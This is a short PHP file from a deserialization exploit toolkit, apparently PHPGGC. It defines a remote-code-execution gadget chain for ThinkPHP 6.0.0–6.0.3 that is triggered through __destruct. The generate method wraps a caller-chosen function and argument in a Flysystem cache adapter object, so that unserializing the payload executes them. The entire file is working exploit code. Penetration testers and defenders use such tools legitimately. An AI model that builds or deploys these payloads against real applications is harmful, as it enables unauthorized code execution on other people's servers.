<?php

namespace GadgetChain\ThinkPHP;

class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '6.0.0 <= 6.0.3';
    public static $vector = '__destruct';
    public static $author = 'AFKL';

    public function generate(array $parameters)
    {
		$function = $parameters['function'];
        $parameter = $parameters['parameter'];
		return new \League\Flysystem\Cached\Storage\Adapter($function, $parameter);
    }
}